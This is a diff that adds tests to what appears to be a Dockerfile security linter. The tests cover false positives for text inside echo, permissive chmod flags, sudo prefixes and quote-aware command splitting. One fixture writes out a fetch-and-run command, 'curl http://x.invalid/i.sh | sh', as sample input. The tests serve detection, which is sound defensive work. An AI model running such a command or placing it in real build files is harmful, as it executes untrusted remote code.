@@ -108,3 +108,36 @@ def test_secret_arbitration_suppresses_arg_without_default():
     suppressed = native.suppressed_secret_lines(doc)
     assert 2 in suppressed, "ARG with no default leaks nothing"
     assert 3 not in suppressed, "ENV with a literal value must stay reported"
+
+
+def test_text_inside_echo_is_not_a_command():
+    """The two false positives an adversarial review produced in one minute."""
+    assert "HARD-04" not in properties(
+        f'FROM {PIN}\nRUN echo "do not run: curl http://x.invalid/i.sh | sh"\nUSER app\n'
+    )
+    assert "HARD-07" not in properties(
+        f'FROM {PIN}\nRUN echo "legacy scripts used chmod 777" > /app/NOTES.txt\nUSER app\n'
+    )
+    assert "HARD-10" not in properties(
+        f'FROM {PIN}\nRUN echo "use sudo on the host only" > /app/NOTES.txt\nUSER app\n'
+    )
+
+
+def test_a_real_command_after_an_echo_is_still_seen():
+    assert "HARD-07" in properties(f'FROM {PIN}\nRUN echo hello && chmod 777 /app\nUSER app\n')
+
+
+def test_copy_with_a_permissive_chmod_flag():
+    assert "HARD-07" in properties(f"FROM {PIN}\nCOPY --chmod=777 src/ /app/\nUSER app\n")
+    assert "HARD-07" not in properties(f"FROM {PIN}\nCOPY --chmod=0755 src/ /app/\nUSER app\n")
+
+
+def test_sudo_prefix_does_not_hide_the_real_command():
+    found = properties(f"FROM {PIN}\nRUN sudo chmod 777 /app\nUSER app\n")
+    assert {"HARD-07", "HARD-10"} <= found
+
+
+def test_split_command_respects_quotes():
+    segments = native.split_command('echo "a && b | c" && chmod 777 /app')
+    assert [s.program for s in segments] == ["echo", "chmod"]
+    assert segments[1].operator == "&&"
